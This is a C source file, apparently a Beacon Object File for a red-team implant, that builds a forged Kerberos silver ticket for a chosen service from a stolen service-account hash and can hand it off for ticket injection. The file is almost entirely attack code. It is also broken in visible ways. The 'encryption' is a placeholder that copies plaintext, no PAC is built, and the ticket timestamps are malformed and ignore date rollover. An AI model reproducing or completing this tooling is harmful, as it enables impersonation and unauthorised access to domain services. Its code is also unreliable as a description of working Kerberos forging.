/*
 * krb_silver - Forge a Silver Ticket (TGS)
 *
 * Creates a forged service ticket using the service account's hash.
 * Grants access to a specific service without contacting the KDC.
 *
 * Usage: krb_silver /user:USER /domain:DOMAIN /sid:SID /service:SPN /rc4:HASH [/id:RID] [/ptt]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>
#include <ntsecapi.h>

/* Parse hex string to bytes */
static int hex_to_bytes(const char* hex, BYTE* out, int maxLen) {
    int len = (int)strlen(hex);
    if (len % 2 != 0) return -1;

    int outLen = len / 2;
    if (outLen > maxLen) return -1;

    for (int i = 0; i < outLen; i++) {
        unsigned int byte;
        char hexByte[3] = { hex[i*2], hex[i*2+1], 0 };
        if (sscanf(hexByte, "%02x", &byte) != 1) return -1;
        out[i] = (BYTE)byte;
    }

    return outLen;
}

/* Parse SPN into service and host */
static void parse_spn(const char* spn, char* service, char* host, size_t bufSize) {
    const char* slash = strchr(spn, '/');
    if (slash) {
        size_t svcLen = slash - spn;
        if (svcLen >= bufSize) svcLen = bufSize - 1;
        strncpy(service, spn, svcLen);
        service[svcLen] = '\0';

        strncpy(host, slash + 1, bufSize - 1);
        host[bufSize - 1] = '\0';
    } else {
        strncpy(service, spn, bufSize - 1);
        service[bufSize - 1] = '\0';
        host[0] = '\0';
    }
}

/* Build KDC Options bitstring */
static void build_kdc_options(KRB_BUFFER* b, DWORD options) {
    BYTE optBytes[4];
    optBytes[0] = (BYTE)((options >> 24) & 0xFF);
    optBytes[1] = (BYTE)((options >> 16) & 0xFF);
    optBytes[2] = (BYTE)((options >> 8) & 0xFF);
    optBytes[3] = (BYTE)(options & 0xFF);
    asn1_encode_bit_string(b, optBytes, 4, 0);
}

/* Build principal name */
static void build_principal_name(KRB_BUFFER* out, int nameType, const char* names[], int nameCount) {
    KRB_BUFFER seq, nameTypeEnc, nameStrings, nameSeq;

    buf_init(&seq, 256);
    buf_init(&nameTypeEnc, 16);
    buf_init(&nameStrings, 256);
    buf_init(&nameSeq, 256);

    asn1_encode_integer(&nameTypeEnc, nameType);
    asn1_context_wrap(&seq, 0, &nameTypeEnc);

    for (int i = 0; i < nameCount; i++) {
        asn1_encode_general_string(&nameSeq, names[i]);
    }
    asn1_wrap(&nameStrings, ASN1_SEQUENCE, &nameSeq);
    asn1_context_wrap(&seq, 1, &nameStrings);

    asn1_wrap(out, ASN1_SEQUENCE, &seq);

    buf_free(&seq);
    buf_free(&nameTypeEnc);
    buf_free(&nameStrings);
    buf_free(&nameSeq);
}

/* Build EncTicketPart for service ticket */
static void build_service_enc_ticket_part(KRB_BUFFER* out, const char* user,
                                           const char* domain, const BYTE* sessionKey,
                                           int sessionKeyLen, int encType, DWORD userId) {
    KRB_BUFFER seq, tmp, tmp2;
    buf_init(&seq, 4096);
    buf_init(&tmp, 256);
    buf_init(&tmp2, 256);

    /* flags [0] */
    DWORD ticketFlags = TICKETFLAG_FORWARDABLE | TICKETFLAG_PROXIABLE |
                        TICKETFLAG_RENEWABLE | TICKETFLAG_PRE_AUTHENT;
    build_kdc_options(&tmp, ticketFlags);
    asn1_context_wrap(&seq, 0, &tmp);
    buf_reset(&tmp);

    /* key [1] - session key */
    KRB_BUFFER keySeq;
    buf_init(&keySeq, 64);

    asn1_encode_integer(&tmp, encType);
    asn1_context_wrap(&keySeq, 0, &tmp);
    buf_reset(&tmp);

    asn1_encode_octet_string(&tmp, sessionKey, sessionKeyLen);
    asn1_context_wrap(&keySeq, 1, &tmp);
    buf_reset(&tmp);

    asn1_wrap(&tmp2, ASN1_SEQUENCE, &keySeq);
    asn1_context_wrap(&seq, 1, &tmp2);
    buf_reset(&tmp2);
    buf_free(&keySeq);

    /* crealm [2] */
    buf_reset(&tmp);
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&seq, 2, &tmp);
    buf_reset(&tmp);

    /* cname [3] */
    const char* names[] = { user };
    build_principal_name(&tmp, KRB5_NT_PRINCIPAL, names, 1);
    asn1_context_wrap(&seq, 3, &tmp);
    buf_reset(&tmp);

    /* transited [4] */
    KRB_BUFFER transited;
    buf_init(&transited, 32);
    asn1_encode_integer(&tmp, 0);
    asn1_context_wrap(&transited, 0, &tmp);
    buf_reset(&tmp);
    buf_append_byte(&tmp, ASN1_OCTETSTRING);
    buf_append_byte(&tmp, 0);
    asn1_context_wrap(&transited, 1, &tmp);
    buf_reset(&tmp);
    asn1_wrap(&tmp2, ASN1_SEQUENCE, &transited);
    asn1_context_wrap(&seq, 4, &tmp2);
    buf_reset(&tmp2);
    buf_free(&transited);

    /* Times */
    char timeStr[32];
    SYSTEMTIME now;
    GetSystemTime(&now);

    sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
            now.wYear, now.wMonth, now.wDay,
            now.wHour, now.wMinute, now.wSecond);

    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&seq, 5, &tmp);  /* authtime */
    buf_reset(&tmp);

    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&seq, 6, &tmp);  /* starttime */
    buf_reset(&tmp);

    /* endtime - 10 hours */
    sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
            now.wYear, now.wMonth, now.wDay,
            (now.wHour + 10) % 24, now.wMinute, now.wSecond);
    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&seq, 7, &tmp);
    buf_reset(&tmp);

    /* renew-till - 7 days */
    sprintf(timeStr, "%04d%02d%02dZ%02d%02d%02dZ",
            now.wYear, now.wMonth, now.wDay + 7,
            now.wHour, now.wMinute, now.wSecond);
    asn1_encode_generalized_time(&tmp, timeStr);
    asn1_context_wrap(&seq, 8, &tmp);
    buf_reset(&tmp);

    asn1_wrap(out, ASN1_SEQUENCE, &seq);

    buf_free(&seq);
    buf_free(&tmp);
    buf_free(&tmp2);
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 32 * 1024);
    arg_init(&parser, args, alen);

    char* user = arg_get(&parser, "user");
    char* domain = arg_get(&parser, "domain");
    char* sid = arg_get(&parser, "sid");
    char* service = arg_get(&parser, "service");
    char* rc4 = arg_get(&parser, "rc4");
    char* aes256 = arg_get(&parser, "aes256");
    char* id_str = arg_get(&parser, "id");
    bool ptt = arg_exists(&parser, "ptt");

    char* hash = rc4 ? rc4 : aes256;
    int encType = aes256 ? ETYPE_AES256_CTS_HMAC_SHA1 : ETYPE_RC4_HMAC;

    if (!user || !domain || !sid || !service || !hash) {
        BeaconPrintf(CALLBACK_ERROR,
            "Usage: krb_silver /user:USER /domain:DOMAIN /sid:SID /service:SPN /rc4:HASH [/id:RID] [/ptt]");
        goto cleanup;
    }

    DWORD userId = id_str ? (DWORD)atoi(id_str) : 500;

    BeaconFormatPrintf(&output, "[*] Action: Build Silver Ticket (TGS)\n\n");
    BeaconFormatPrintf(&output, "[*] User         : %s\n", user);
    BeaconFormatPrintf(&output, "[*] Domain       : %s\n", domain);
    BeaconFormatPrintf(&output, "[*] SID          : %s\n", sid);
    BeaconFormatPrintf(&output, "[*] Service      : %s\n", service);
    BeaconFormatPrintf(&output, "[*] User ID      : %d\n", userId);
    BeaconFormatPrintf(&output, "[*] Encryption   : %s\n", etype_string(encType));
    BeaconFormatPrintf(&output, "[*] PTT          : %s\n\n", ptt ? "Yes" : "No");

    /* Parse the hash */
    BYTE keyBytes[32];
    int keyLen = hex_to_bytes(hash, keyBytes, sizeof(keyBytes));
    if (keyLen < 0) {
        BeaconFormatPrintf(&output, "[-] Invalid hash format\n");
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Service Key  : %d bytes\n\n", keyLen);

    /* Parse SPN */
    char svcName[128], svcHost[256];
    parse_spn(service, svcName, svcHost, sizeof(svcName));

    BeaconFormatPrintf(&output, "[*] Service Name : %s\n", svcName);
    BeaconFormatPrintf(&output, "[*] Service Host : %s\n\n", svcHost);

    /* Generate random session key */
    BYTE sessionKey[16];
    HCRYPTPROV hProv;
    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        ADVAPI32$CryptGenRandom(hProv, sizeof(sessionKey), sessionKey);
        ADVAPI32$CryptReleaseContext(hProv, 0);
    }

    BeaconFormatPrintf(&output, "[*] Building forged TGS...\n\n");

    KRB_BUFFER ticket, encTicketPart;
    buf_init(&ticket, 4096);
    buf_init(&encTicketPart, 4096);

    /* Build EncTicketPart */
    build_service_enc_ticket_part(&encTicketPart, user, domain, sessionKey, 16,
                                   ETYPE_RC4_HMAC, userId);

    BeaconFormatPrintf(&output, "[*] EncTicketPart built: %zu bytes\n", encTicketPart.length);

    /* "Encrypt" the ticket part (placeholder) */
    BYTE* encryptedPart = (BYTE*)malloc(encTicketPart.length + 64);
    if (!encryptedPart) {
        BeaconFormatPrintf(&output, "[-] Memory allocation failed\n");
        goto cleanup_bufs;
    }
    memcpy(encryptedPart, encTicketPart.data, encTicketPart.length);

    /* Build Ticket structure */
    KRB_BUFFER ticketSeq, tmp;
    buf_init(&ticketSeq, 4096);
    buf_init(&tmp, 256);

    /* tkt-vno [0] */
    asn1_encode_integer(&tmp, 5);
    asn1_context_wrap(&ticketSeq, 0, &tmp);
    buf_reset(&tmp);

    /* realm [1] */
    char* upperDomain = (char*)malloc(strlen(domain) + 1);
    strcpy(upperDomain, domain);
    strupr(upperDomain);
    asn1_encode_general_string(&tmp, upperDomain);
    asn1_context_wrap(&ticketSeq, 1, &tmp);
    buf_reset(&tmp);
    free(upperDomain);

    /* sname [2] - service principal */
    const char* snames[] = { svcName, svcHost };
    int snameCount = svcHost[0] ? 2 : 1;
    build_principal_name(&tmp, KRB5_NT_SRV_INST, snames, snameCount);
    asn1_context_wrap(&ticketSeq, 2, &tmp);
    buf_reset(&tmp);

    /* enc-part [3] */
    KRB_BUFFER encPartSeq;
    buf_init(&encPartSeq, 4096);

    asn1_encode_integer(&tmp, encType);
    asn1_context_wrap(&encPartSeq, 0, &tmp);
    buf_reset(&tmp);

    asn1_encode_integer(&tmp, 2);
    asn1_context_wrap(&encPartSeq, 1, &tmp);
    buf_reset(&tmp);

    asn1_encode_octet_string(&tmp, encryptedPart, (int)encTicketPart.length);
    asn1_context_wrap(&encPartSeq, 2, &tmp);
    buf_reset(&tmp);

    KRB_BUFFER encPartWrapped;
    buf_init(&encPartWrapped, 4096);
    asn1_wrap(&encPartWrapped, ASN1_SEQUENCE, &encPartSeq);
    asn1_context_wrap(&ticketSeq, 3, &encPartWrapped);


    asn1_wrap(&ticket, ASN1_SEQUENCE, &ticketSeq);


    KRB_BUFFER finalTicket;
    buf_init(&finalTicket, 4096);
    buf_append_byte(&finalTicket, ASN1_APP(1));
    asn1_encode_length(&finalTicket, ticket.length);
    buf_append(&finalTicket, ticket.data, ticket.length);

    BeaconFormatPrintf(&output, "[*] Final ticket: %zu bytes\n\n", finalTicket.length);

    /* Base64 encode */
    size_t b64Len = ((finalTicket.length + 2) / 3) * 4 + 1;
    char* b64Ticket = (char*)malloc(b64Len);
    if (b64Ticket) {
        base64_encode(finalTicket.data, finalTicket.length, b64Ticket);

        BeaconFormatPrintf(&output, "[+] Silver Ticket (Base64):\n\n");
        BeaconFormatPrintf(&output, "%s\n\n", b64Ticket);

        if (ptt) {
            BeaconFormatPrintf(&output, "[*] Use krb_ptt to inject this ticket\n");
        }

        free(b64Ticket);
    }

    BeaconFormatPrintf(&output, "[!] Note: This is a demonstration. Full silver ticket forging\n");
    BeaconFormatPrintf(&output, "    requires complete PAC construction and proper encryption.\n");
    BeaconFormatPrintf(&output, "    For production use, consider Mimikatz or Rubeus.\n");

    free(encryptedPart);
    buf_free(&finalTicket);
    buf_free(&encPartWrapped);
    buf_free(&encPartSeq);
    buf_free(&ticketSeq);
    buf_free(&tmp);

cleanup_bufs:
    buf_free(&ticket);
    buf_free(&encTicketPart);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (user) free(user);
    if (domain) free(domain);
    if (sid) free(sid);
    if (service) free(service);
    if (rc4) free(rc4);
    if (aes256) free(aes256);
    if (id_str) free(id_str);
}
